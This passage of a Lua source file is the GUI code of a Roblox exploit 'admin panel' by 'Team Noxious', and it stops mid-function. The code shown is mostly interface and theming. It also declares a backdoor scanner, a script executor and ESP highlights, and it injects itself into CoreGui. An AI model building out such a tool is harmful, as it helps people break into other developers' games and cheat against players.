--[[---------------------------------------------------------------------------------------------------------------------------
  __   __     __  __     ______          __         __  __     ______     ______     ______  
 /\ "-.\ \   /\_\_\_\   /\  ___\       _/\ \__     /\ \/\ \   /\  ___\   /\  __ \   /\  == \ 
 \ \ \-.  \  \/_/\_\/_  \ \___  \     /\__  __\    \ \ \_\ \  \ \___  \  \ \  __ \  \ \  _-/ 
  \ \_\\"\_\   /\_\/\_\  \/\_____\    \/_/\_\_/     \ \_____\  \/\_____\  \ \_\ \_\  \ \_\   
   \/_/ \/_/   \/_/\/_/   \/_____/       \/_/        \/_____/   \/_____/   \/_/\/_/   \/_/  
   
   Made by Team Noxious -- unable's stupid admin panel >.< [version 4]
   
---------------------------------------------------------------------------------------------------------------------------]]--

wait(0.1) unable = {} unable["test game"] = 118022198489171

---------------------------------------------------------------------------------------------------------------------------]]--

unable["version"] = "4"
unable["workspace"] = game.Workspace
unable["user input service"] = game:GetService("UserInputService")
unable["players"] = game:GetService("Players")
unable["local player"] = unable["players"].LocalPlayer
unable["player gui"] = unable["local player"]:FindFirstChildWhichIsA("PlayerGui")
unable["user input service"] = game:GetService("UserInputService")
unable["tween service"] = game:GetService("TweenService")
unable["http service"] = game:GetService("HttpService")
unable["marketplace service"] = game:GetService("MarketplaceService")
unable["run service"] = game:GetService("RunService")
unable["teleport service"] = game:GetService("TeleportService")
unable["starter gui"] = game:GetService("StarterGui")
unable["gui service"] = game:GetService("GuiService")
unable["lighting"] = game:GetService("Lighting")
unable["context action service"] = game:GetService("ContextActionService")
unable["network client"] = game:GetService("NetworkClient")
unable["replicated storage"] = game:GetService("ReplicatedStorage")
unable["group service"] = game:GetService("GroupService")
unable["pathfinding service"] = game:GetService("PathfindingService")
unable["sound service"] = game:GetService("SoundService")
unable["teams"] = game:GetService("Teams")
unable["starter player"] = game:GetService("StarterPlayer")
unable["insert service"] = game:GetService("InsertService")
unable["chat"] = game:GetService("Chat")
unable["proximity prompt service"] = game:GetService("ProximityPromptService")
unable["stats"] = game:GetService("Stats")
unable["material service"] = game:GetService("MaterialService")
unable["avatar editor service"] = game:GetService("AvatarEditorService")
unable["text chat service"] = game:GetService("TextChatService")
unable["unlocked"] = false
unable["is mobile?"] = game:GetService("UserInputService").TouchEnabled

-------------------------------------------------------------------------------------------------------------------------------

unable["screen gui"] = Instance.new("ScreenGui")
unable["screen gui"].Name = ":3"
unable["screen gui"].ResetOnSpawn = false

if game.PlaceId == unable["test game"] then
	unable["screen gui"].Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
else
	unable["screen gui"].Parent = game:GetService("CoreGui")
end

unable["wm"] = Instance.new("TextLabel")
unable["toggle interface visibility button"] = Instance.new("TextButton")
unable["toggle interface visibility button?"] = Instance.new("TextLabel")
unable["top bar"] = Instance.new("TextLabel")
unable["top bar close button"] = Instance.new("TextButton")
unable["top bar minimize button"] = Instance.new("TextButton")
unable["top bar reposition button"] = Instance.new("TextButton")

unable["donut tab top bar"] = Instance.new("TextLabel")
unable["donut tab top bar close button"] = Instance.new("TextButton")
unable["donut tab top bar minimize button"] = Instance.new("TextButton")
unable["donut tab top bar reposition button"] = Instance.new("TextButton")

unable["donut tab top bar"] = Instance.new("TextLabel")
unable["donut tab top bar close button"] = Instance.new("TextButton")
unable["donut tab top bar minimize button"] = Instance.new("TextButton")
unable["donut tab top bar reposition button"] = Instance.new("TextButton")

unable["donut tab main frame 1"] = Instance.new("Frame")
unable["donut tab block all"] = Instance.new("Frame")
unable["donut tab block main frame"] = Instance.new("Frame")

unable["donut"] = Instance.new("TextLabel")

unable["binary tab top bar"] = Instance.new("TextLabel")
unable["binary tab top bar close button"] = Instance.new("TextButton")
unable["binary tab top bar minimize button"] = Instance.new("TextButton")
unable["binary tab top bar reposition button"] = Instance.new("TextButton")

unable["binary tab top bar"] = Instance.new("TextLabel")
unable["binary tab top bar close button"] = Instance.new("TextButton")
unable["binary tab top bar minimize button"] = Instance.new("TextButton")
unable["binary tab top bar reposition button"] = Instance.new("TextButton")

unable["binary tab main frame 1"] = Instance.new("Frame")
unable["binary tab block all"] = Instance.new("Frame")
unable["binary tab block main frame"] = Instance.new("Frame")

unable["binary"] = Instance.new("TextLabel")

unable["block all"] = Instance.new("Frame")
unable["main frame 1"] = Instance.new("Frame")
unable["main frame 2"] = Instance.new("Frame")
unable["main frame 3"] = Instance.new("Frame")
unable["main frame 4"] = Instance.new("Frame")
unable["block main frame"] = Instance.new("Frame")
unable["password frame"] = Instance.new("Frame")
unable["password text"] = Instance.new("TextLabel")
unable["password box"] = Instance.new("TextBox")
unable["introduction"] = Instance.new("TextLabel")
unable["player information tab"] = Instance.new("TextButton")
unable["server information tab"] = Instance.new("TextButton")
unable["console output tab"] = Instance.new("TextButton")
unable["console label"] = Instance.new("TextLabel")
unable["output holder"] = Instance.new("Frame")
unable["output scrolling frame"] = Instance.new("ScrollingFrame")
unable["output textbox"] = Instance.new("TextBox")
unable["clear console button"] = Instance.new("TextButton")
unable["server information holder"] = Instance.new("TextLabel")
unable["information holder"] = Instance.new("TextLabel")
unable["script settings tab"] = Instance.new("TextButton")
unable["server settings tab"] = Instance.new("TextButton")
unable["server settings holder"] = Instance.new("Frame")
unable["change fps cap"] = Instance.new("TextLabel")
unable["change fps cap setting"] = Instance.new("TextButton")
unable["change fps cap textbox"] = Instance.new("TextBox")
unable["rejoin server"] = Instance.new("TextButton")
unable["leave game"] = Instance.new("TextButton")
unable["server hop"] = Instance.new("TextButton")
unable["auto rejoin toggle"] = Instance.new("TextLabel")
unable["toggle auto rejoin on"] = Instance.new("TextButton")
unable["toggle auto rejoin off"] = Instance.new("TextButton")
unable["script settings holder"] = Instance.new("Frame")
unable["last updated"] = Instance.new("TextLabel")
unable["current theme"] = Instance.new("TextLabel")
unable["change theme setting"] = Instance.new("TextButton")
unable["command prefix"] = Instance.new("TextLabel")
unable["change command prefix setting"] = Instance.new("TextButton")
unable["change command prefix textbox"] = Instance.new("TextBox")
unable["change click sound setting"] = Instance.new("TextLabel")
unable["change click sound"] = Instance.new("TextButton")
unable["change click sound textbox"] = Instance.new("TextBox")
unable["backdoor info"] = Instance.new("TextButton")
unable["backdoor info holder"] = Instance.new("TextLabel")
unable["scanning"] = Instance.new("TextButton")
unable["logs holder"] = Instance.new("Frame")
unable["logs label"] = Instance.new("TextLabel")
unable["logs scrolling frame"] = Instance.new("ScrollingFrame")
unable["logs textbox"] = Instance.new("TextBox")
unable["backdoor scan button"] = Instance.new("TextButton")
unable["credits"] = Instance.new("TextButton")
unable["credits holder"] = Instance.new("TextLabel")
unable["scripts tab"] = Instance.new("TextButton")
unable["button holder"] = Instance.new("Frame")
unable["next page"] = Instance.new("TextButton")
unable["previous page"] = Instance.new("TextButton")
unable["script search bar"] = Instance.new("TextBox")
unable["commands tab"] = Instance.new("TextButton")
unable["list of commands"] = Instance.new("ScrollingFrame")
unable["command bar"] = Instance.new("TextBox")
unable["execute command button"] = Instance.new("TextButton")
unable["asset ids tab"] = Instance.new("TextButton")
unable["asset id type indicator"] = Instance.new("TextLabel")
unable["switch asset id type button"] = Instance.new("TextButton")
unable["switch asset id type button 2"] = Instance.new("TextButton")
unable["asset image 1"] = Instance.new("ImageLabel")
unable["asset image name 1"] = Instance.new("TextLabel")
unable["asset image id 1"] = Instance.new("TextBox")
unable["copy asset id 1 button"] = Instance.new("TextButton")
unable["asset image 2"] = Instance.new("ImageLabel")
unable["asset image name 2"] = Instance.new("TextLabel")
unable["asset image id 2"] = Instance.new("TextBox")
unable["copy asset id 2 button"] = Instance.new("TextButton")
unable["asset image 3"] = Instance.new("ImageLabel")
unable["asset image name 3"] = Instance.new("TextLabel")
unable["asset image id 3"] = Instance.new("TextBox")
unable["copy asset id 3 button"] = Instance.new("TextButton")
unable["next page 2 button"] = Instance.new("TextButton")
unable["previous page 2 button"] = Instance.new("TextButton")
unable["executor tab"] = Instance.new("TextButton")
unable["executor scrolling frame"] = Instance.new("ScrollingFrame")
unable["executor textbox"] = Instance.new("TextBox")
unable["execute button"] = Instance.new("TextButton")
unable["execute from client button"] = Instance.new("TextButton")
unable["clear button"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

unable["emoticon"] = "o.o"

rainbowtheme = false
grayscaletheme = false
noxioustheme = false
c00l2theme = false
c00ltheme = false
lighttheme = false

local initialcols = {
	background = Color3.fromHex("252539"),
	border = Color3.fromHex("4051ED"),
	half = Color3.fromHex("2F3B9C"),
	white = Color3.fromHex("FFFFFF")
}

unable["default background color"] = initialcols.background
unable["default border color"] = initialcols.border
unable["default 1/2 color"] = initialcols.half
unable["default text color"] = initialcols.border
unable["default text font"] = Enum.Font.RobotoMono

function sdfont(font)
	if typeof(font) == "EnumItem" and font.EnumType == Enum.Font then
		unable["default text font"] = font
	end
end

local hues = 0.002

function shiftcol(color)
	local h, s, v = color:ToHSV()
	return Color3.fromHSV((h + hues) % 1, s, v)
end

function grayscale(color)
	local luminance = 0.2126 * color.R + 0.7152 * color.G + 0.0722 * color.B
	return Color3.new(luminance, luminance, luminance)
end

donuttabreallyminimized = false
binarytabreallyminimized = false

function rbcols()
	unable["default background color"] = shiftcol(unable["default background color"])
	unable["default border color"] = shiftcol(unable["default border color"])
	unable["default 1/2 color"] = shiftcol(unable["default 1/2 color"])
	unable["default text color"] = shiftcol(unable["default border color"])
	sdfont(Enum.Font.RobotoMono)
	unable["top bar"].Text = " [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	if donuttabreallyminimized then
		unable["donut tab top bar"].Text = " donut.lua >.<"
	else
		unable["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		unable["binary tab top bar"].Text = " binary.lua >.<"
	else
		unable["binary tab top bar"].Text = " binary.lua o.o"
	end
end

function grayscalecols()
	unable["default background color"] = grayscale(initialcols.background)
	unable["default border color"] = grayscale(initialcols.border)
	unable["default text color"] = grayscale(initialcols.border)
	unable["default 1/2 color"] = grayscale(initialcols.half)
	sdfont(Enum.Font.RobotoMono)
	unable["top bar"].Text = " [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	if donuttabreallyminimized then
		unable["donut tab top bar"].Text = " donut.lua >.<"
	else
		unable["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		unable["binary tab top bar"].Text = " binary.lua >.<"
	else
		unable["binary tab top bar"].Text = " binary.lua o.o"
	end
end

function noxiouscols()
	unable["default background color"] = Color3.new(0, 0, 0)
	unable["default border color"] = Color3.new(1, 1, 1)
	unable["default text color"] = Color3.new(1, 1, 1)
	unable["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.Nunito)
	unable["top bar"].Text = "  [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	if donuttabreallyminimized then
		unable["donut tab top bar"].Text = "  donut.lua >.<"
	else
		unable["donut tab top bar"].Text = "  donut.lua o.o"
	end
	if binarytabreallyminimized then
		unable["binary tab top bar"].Text = "  binary.lua >.<"
	else
		unable["binary tab top bar"].Text = "  binary.lua o.o"
	end
end

function c00l2cols()
	unable["default background color"] = Color3.new(0, 0, 0)
	unable["default text color"] = Color3.new(1, 1, 1)
	unable["default border color"] = initialcols.border
	unable["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.SourceSans)
	unable["top bar"].Text = "   [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	if donuttabreallyminimized then
		unable["donut tab top bar"].Text = "   donut.lua >.<"
	else
		unable["donut tab top bar"].Text = "   donut.lua o.o"
	end
	if binarytabreallyminimized then
		unable["binary tab top bar"].Text = "   binary.lua >.<"
	else
		unable["binary tab top bar"].Text = "   binary.lua o.o"
	end
end

function c00lcols()
	unable["default background color"] = Color3.new(0, 0, 0)
	unable["default text color"] = Color3.new(1, 1, 1)
	unable["default border color"] = Color3.new(1, 0, 0)
	unable["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.SourceSans)
	unable["top bar"].Text = "   [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	if donuttabreallyminimized then
		unable["donut tab top bar"].Text = "   donut.lua >.<"
	else
		unable["donut tab top bar"].Text = "   donut.lua o.o"
	end
	if binarytabreallyminimized then
		unable["binary tab top bar"].Text = "   binary.lua >.<"
	else
		unable["binary tab top bar"].Text = "   binary.lua o.o"
	end
end

function lightcols()
	unable["default background color"] = Color3.fromHex("d0d4f7")
	unable["default border color"] = initialcols.border
	unable["default 1/2 color"] = Color3.fromHex("919aeb")
	unable["default text color"] = initialcols.border
	sdfont(Enum.Font.RobotoMono)
	unable["top bar"].Text = " [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	if donuttabreallyminimized then
		unable["donut tab top bar"].Text = " donut.lua >.<"
	else
		unable["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		unable["binary tab top bar"].Text = " binary.lua >.<"
	else
		unable["binary tab top bar"].Text = " binary.lua o.o"
	end
end

function restorecols()
	unable["default background color"] = initialcols.background
	unable["default border color"] = initialcols.border
	unable["default 1/2 color"] = initialcols.half
	unable["default text color"] = initialcols.border
	sdfont(Enum.Font.RobotoMono)
	unable["top bar"].Text = " [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	if donuttabreallyminimized then
		unable["donut tab top bar"].Text = " donut.lua >.<"
	else
		unable["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		unable["binary tab top bar"].Text = " binary.lua >.<"
	else
		unable["binary tab top bar"].Text = " binary.lua o.o"
	end
end

local rbconnection

local rbinterval = 0.01
local lastupd = 0

function startrb()
	if not rbconnection then
		rbconnection = unable["run service"].Heartbeat:Connect(function(deltaTime)
			lastupd = lastupd + deltaTime
			if lastupd >= rbinterval then
				lastupd = 0
				if rainbowtheme then
					rbcols()
				else
					stoprb()
					restorecols()
				end
			end
		end)
	end
end

function stoprb()
	if rbconnection then
		rbconnection:Disconnect()
		rbconnection = nil
	end
end

function applycurrenttheme()
	if rainbowtheme then
		rbcols()
	elseif grayscaletheme then
		grayscalecols()
	elseif noxioustheme then
		noxiouscols()
	elseif c00l2theme then
		c00l2cols()
	elseif c00ltheme then
		c00lcols()
	elseif lighttheme then
		lightcols()
	else
		restorecols()
	end
end

local screenGui = unable["screen gui"].Parent:FindFirstChild(":3")

function applycols(object)
	if object:IsA("TextButton") or object:IsA("TextLabel") or object:IsA("Frame") or object:IsA("ScrollingFrame") or object:IsA("TextBox") or object:IsA("ImageLabel") then
		object.BackgroundColor3 = unable["default background color"]
		object.BorderColor3 = unable["default border color"]
	end

	if object:IsA("TextButton") or object:IsA("TextLabel") or object:IsA("TextBox") then
		object.TextColor3 = unable["default text color"]
		object.Font = unable["default text font"]
	end

	if object:IsA("TextBox") then
		object.PlaceholderColor3 = unable["default 1/2 color"]
	end

	if object:IsA("TextLabel") and object.Name == "backdoor" then
		object.TextColor3 = unable["default background color"]
		object.TextStrokeColor3 = unable["default border color"]
	end

	if object:IsA("TextLabel") and object.Name == "fakebutton" then
		object.TextColor3 = unable["default 1/2 color"]
		object.BorderColor3 = unable["default 1/2 color"]
	end

	if object:IsA("TextLabel") and object.Name == "stay" then
		object.Font = Enum.Font.RobotoMono
	end

	if object:IsA("TextLabel") and object.Name == "fakebox" then
		local txtlength = #unable["password box"].Text

		if unable["typing"] == false then
			if txtlength == 0 then
				object.TextColor3 = unable["default 1/2 color"]
			else
				object.TextColor3 = unable["default border color"]
			end
		else
			if txtlength > 0 then
				object.TextColor3 = unable["default border color"]
			else
				object.TextColor3 = unable["default 1/2 color"]
			end
		end
	end

	if object:IsA("ScrollingFrame") then
		object.ScrollBarImageColor3 = unable["default 1/2 color"]
	end

	if object:IsA("ImageLabel") and object.Image == "rbxassetid://110126477790022" then
		if c00ltheme or c00l2theme == true then
			object.ImageColor3 = unable["default text color"]
		else
			object.ImageColor3 = unable["default border color"]
		end
	end

	if object:IsA("Highlight") then		
		if noxioustheme then 
			object.FillColor = unable["default background color"]
		else
			object.FillColor = unable["default border color"]
		end
		object.OutlineColor = Color3.new(1, 1, 1)
	end

	if object:IsA("BillboardGui") and object.Name == "unableesp" then
		local label = object:FindFirstChildOfClass("TextLabel")
		if label then
			if noxioustheme then
				label.TextColor3 = unable["default background color"]
			else
				label.TextColor3 = unable["default border color"]
			end
		end
	end
end

local function updcols()
	applycurrenttheme()

	if screenGui then
		for _, object in pairs(screenGui:GetDescendants()) do
			applycols(object)
		end
	end

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Highlight") or (descendant:IsA("BillboardGui") and descendant.Name == "unableesp") then
			applycols(descendant)
		end
	end
end

unable["run service"].Heartbeat:Connect(function(deltaTime)
	updcols()
	wait(0)
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["click sound"] = Instance.new"Sound"
unable["click sound"].SoundId = "rbxassetid://226892749"
unable["click sound"].Parent = unable["local player"]
unable["click sound"].Name = "canttouchthis"
unable["click sound"].Volume = 0.4

unable["startup"] = Instance.new"Sound"
unable["startup"].SoundId = "rbxassetid://8503529653"
unable["startup"].Parent = unable["local player"]
unable["startup"].Volume = 0
unable["startup"].TimePosition = 0

function playclicksound()
	local newSound = unable["click sound"]:Clone()

	newSound.Parent = unable["click sound"].Parent

	newSound:Play()

	newSound.Ended:Connect(function()
		newSound:Destroy()
	end)
end

unable["startup"]:Play()
unable["startup"]:Stop()
wait(0.1)
unable["startup"].Volume = 3.5

local function grs(l)
	local chars = {"▓", "▒", "░"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

local function grs2(l)
	local chars = {"1", "0"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

-------------------------------------------------------------------------------------------------------------------------------

unable["wm"].Name = "backdoor"
unable["wm"].Parent = unable["screen gui"]
unable["wm"].Text = "unable's stupid admin panel [TEAM NOXIOUS]"
unable["wm"].TextColor3 = unable["default border color"]
unable["wm"].TextStrokeColor3 = unable["default background color"]
unable["wm"].TextStrokeTransparency = 0
unable["wm"].BackgroundTransparency = 1
unable["wm"].Font = unable["default text font"]
unable["wm"].TextSize = 14
unable["wm"].TextXAlignment = Enum.TextXAlignment.Right
unable["wm"].TextYAlignment = Enum.TextYAlignment.Bottom
unable["wm"].Size = UDim2.new(0, 200, 0, 30)
unable["wm"].AnchorPoint = Vector2.new(1, 1)
unable["wm"].Position = UDim2.new(1, -5, 1, -5)
unable["wm"].ZIndex = 10000

-------------------------------------------------------------------------------------------------------------------------------

unable["toggle interface visibility button"].Size = UDim2.new(0, 48, 0, 48)
unable["toggle interface visibility button"].Position = UDim2.new(0, 0, 10, 0)

unable["toggle interface visibility button"].BackgroundColor3 = unable["default background color"]

unable["toggle interface visibility button"].BorderColor3 = unable["default border color"]
unable["toggle interface visibility button"].BorderSizePixel = 1

unable["toggle interface visibility button"].TextColor3 = unable["default border color"]
unable["toggle interface visibility button"].Font = Enum.Font.RobotoMono
unable["toggle interface visibility button"].TextSize = 20
unable["toggle interface visibility button"].TextScaled = false
unable["toggle interface visibility button"].Text = ">.<"
unable["toggle interface visibility button"].TextXAlignment = Enum.TextXAlignment.Center
unable["toggle interface visibility button"].TextYAlignment = Enum.TextYAlignment.Center

unable["toggle interface visibility button text padding"] = Instance.new("UIPadding")
unable["toggle interface visibility button text padding"].PaddingTop = UDim.new(0, 0)
unable["toggle interface visibility button text padding"].Parent = unable["toggle interface visibility button"]

unable["toggle interface visibility button"].Parent = unable["screen gui"]
unable["toggle interface visibility button"].ZIndex = 71

-------------------------------------------------------------------------------------------------------------------------------

unable["toggle interface visibility button?"].Size = UDim2.new(0, 48, 0, 48)
unable["toggle interface visibility button?"].Position = UDim2.new(0, 0, 0, 0)

unable["toggle interface visibility button?"].BackgroundColor3 = unable["default background color"]

unable["toggle interface visibility button?"].BorderColor3 = unable["default border color"]
unable["toggle interface visibility button"].BorderSizePixel = 1

unable["toggle interface visibility button?"].TextColor3 = unable["default border color"]
unable["toggle interface visibility button?"].Font = Enum.Font.RobotoMono
unable["toggle interface visibility button?"].TextSize = 20
unable["toggle interface visibility button?"].TextScaled = false
unable["toggle interface visibility button?"].Text = ""
unable["toggle interface visibility button?"].TextXAlignment = Enum.TextXAlignment.Center
unable["toggle interface visibility button?"].TextYAlignment = Enum.TextYAlignment.Center

unable["toggle interface visibility button text padding?"] = Instance.new("UIPadding")
unable["toggle interface visibility button text padding?"].PaddingTop = UDim.new(0, 0)
unable["toggle interface visibility button text padding?"].Parent = unable["toggle interface visibility button?"]

unable["toggle interface visibility button?"].Parent = unable["toggle interface visibility button"]
unable["toggle interface visibility button?"].ZIndex = 72

-------------------------------------------------------------------------------------------------------------------------------

function movebutton()
	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X

	local buttonWidth = 48

	local centerX = (screenWidth - buttonWidth) / 2
	local topMargin = 20
	local centerY = topMargin

	unable["toggle interface visibility button"].Position = UDim2.new(0, centerX, 0, centerY - 150)

	local offsetY = 150
	local targetPosition = UDim2.new(0, centerX, 0, centerY - offsetY)

	local tweenInfoUp = TweenInfo.new(0, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0)

	local tweenUp = unable["tween service"]:Create(unable["toggle interface visibility button"], tweenInfoUp, {Position = targetPosition})

	local function moveButtonBack()
		local tweenInfoDown = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

		local tweenDown = unable["tween service"]:Create(unable["toggle interface visibility button"], tweenInfoDown, {Position = UDim2.new(0, centerX, 0, centerY)})

		tweenDown:Play()
	end

	unable["toggle interface visibility button"].Visible = true
	tweenUp:Play()
	spawn(function() unable["startup"]:Play() end)

	tweenUp.Completed:Wait()
	moveButtonBack()
end

function dragbutton()
	local frame = unable["toggle interface visibility button"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		unable["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	unable["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragbutton()

-------------------------------------------------------------------------------------------------------------------------------

local minimized = false
local canpress = true
local lastVisibleFrame = "main frame 1"
local canpress2 = true

local rotationCycle = {
	["small button top"] = "small button right",
	["small button right"] = "small button bottom",
	["small button bottom"] = "small button left",
	["small button left"] = "small button top"
}

local counterRotationCycle = {
	["small button top"] = "small button left",
	["small button left"] = "small button bottom", 
	["small button bottom"] = "small button right",
	["small button right"] = "small button top"
}

local buttonConfigs = {
	["small button left"] = {
		text = "/]",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if unable["unlocked"] == true then
					unable["password frame"].Visible = false
				else
					unable["password frame"].Visible = true
				end
				unable["main frame 1"].Visible = false
				unable["main frame 2"].Visible = false
				unable["main frame 3"].Visible = false
				unable["main frame 4"].Visible = true
				lastVisibleFrame = "main frame 4"
			end
		end
	},
	["small button right"] = {
		text = "(i)",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if unable["unlocked"] == true then
					unable["password frame"].Visible = false
				else
					unable["password frame"].Visible = true
				end
				unable["main frame 1"].Visible = false
				unable["main frame 2"].Visible = true
				unable["main frame 3"].Visible = false
				unable["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 2"
			end
		end
	},
	["small button top"] = {
		text = ">_",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if unable["unlocked"] == true then
					unable["password frame"].Visible = false
				else
					unable["password frame"].Visible = true
				end
				unable["main frame 1"].Visible = true
				unable["main frame 2"].Visible = false
				unable["main frame 3"].Visible = false
				unable["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 1"
			end
		end
	},
	["small button bottom"] = {
		text = "<+>",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if unable["unlocked"] == true then
					unable["password frame"].Visible = false
				else
					unable["password frame"].Visible = true
				end
				unable["main frame 1"].Visible = false
				unable["main frame 2"].Visible = false
				unable["main frame 3"].Visible = true
				unable["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 3"
			end
		end
	}
}

local originalPositions = {}

local randomRotations = {}

function getRandomRotation()
	return math.random(180, 180)
end

for name, config in pairs(buttonConfigs) do
	unable[name] = Instance.new("TextButton")
	local smallButton = unable[name]
	smallButton.Size = UDim2.new(0, 30, 0, 30)
	smallButton.Position = UDim2.new(0.5, -15, 0.5, -15)
	smallButton.BackgroundColor3 = unable["default background color"]
	smallButton.BorderColor3 = unable["default border color"]
	smallButton.BorderSizePixel = 1
	smallButton.Text = config.text
	smallButton.TextColor3 = unable["default border color"]
	smallButton.Font = Enum.Font.RobotoMono
	smallButton.TextSize = 16
	smallButton.TextScaled = false
	smallButton.TextXAlignment = Enum.TextXAlignment.Center
	smallButton.TextYAlignment = Enum.TextYAlignment.Center
	smallButton.ZIndex = 70
	smallButton.Parent = unable["toggle interface visibility button"]
	smallButton.Visible = false

	originalPositions[name] = smallButton.Position

	randomRotations[name] = getRandomRotation()
	smallButton.Rotation = randomRotations[name]

	smallButton.MouseButton1Click:Connect(function()
		config.onClick()
	end)
end

function tweenPositionAndRotation(object, targetPosition, targetRotation, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = unable["tween service"]:Create(object, tweenInfo, {Position = targetPosition, Rotation = targetRotation})
	tween:Play()
	return tween
end

local initialOffsets = {
	["small button left"] = UDim2.new(0, -10, 0, 0),
	["small button right"] = UDim2.new(0, 10, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, -10),
	["small button bottom"] = UDim2.new(0, 0, 0, 10)
}

local showOffsets = {
	["small button left"] = UDim2.new(0, -50, 0, 0),
	["small button right"] = UDim2.new(0, 50, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, -50),
	["small button bottom"] = UDim2.new(0, 0, 0, 50)
}

local hideOffsets = {
	["small button left"] = UDim2.new(0, 50, 0, 0),
	["small button right"] = UDim2.new(0, -50, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, 50),
	["small button bottom"] = UDim2.new(0, 0, 0, -50)
}

unable["toggle interface visibility button"].MouseButton1Click:Connect(function()
	if not canpress then return end
	playclicksound()

	toggleLoop(false)
	local topBar = unable["top bar"]
	local blockAll = unable["block all"]
	local screenGui = unable["screen gui"]

	if topBar.Visible == false then
		canpress = false

		blockAll.Parent = screenGui
		blockAll.Position = topBar.Position
		blockAll.Size = UDim2.new(0, 401, 0, 0)
		blockAll.BackgroundColor3 = unable["default background color"]
		blockAll.BorderColor3 = unable["default border color"]
		blockAll.BorderSizePixel = 1
		blockAll.ZIndex = 58
		blockAll.Visible = true
		blockAll.BackgroundTransparency = 0

		spawn(function()
			if minimized == true then
				expandTween = unable["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					Size = UDim2.new(0, 401, 0, 26)
				})
			else
				expandTween = unable["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					Size = UDim2.new(0, 401, 0, 276)
				})
			end
			expandTween:Play()
			expandTween.Completed:Wait()

			topBar.Visible = true

			fadeTween = unable["tween service"]:Create(blockAll, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 1
			})
			fadeTween:Play()
			fadeTween.Completed:Wait()

			blockAll.Visible = false
			if scanning == false then
				unable["toggle interface visibility button"].Text = ">.<"
				toggleLoop(true)
			end
			canpress = true
		end)

		spawn(function()
			if not unable["unlocked"] then return end
			if minimized then return end
			local tweens = {}
			for name, offset in pairs(showOffsets) do
				local smallButton = unable[name]
				smallButton.Visible = true
				local targetPosition = originalPositions[name] + offset
				local targetRotation = 0
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)
	else
		canpress = false

		spawn(function()
			blockAll.Parent = screenGui
			blockAll.Position = topBar.Position
			if minimized == true then
				blockAll.Size = UDim2.new(0, 401, 0, 26)
			else
				blockAll.Size = UDim2.new(0, 401, 0, 276)
			end
			blockAll.BackgroundTransparency = 1
			blockAll.Visible = true

			local fadeInTween = unable["tween service"]:Create(blockAll, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 0
			})
			fadeInTween:Play()
			fadeInTween.Completed:Wait()

			topBar.Visible = false

			local shrinkTween = unable["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				Size = UDim2.new(0, 401, 0, 0)
			})
			shrinkTween:Play()
			shrinkTween.Completed:Wait()

			blockAll.Visible = false
			canpress = true
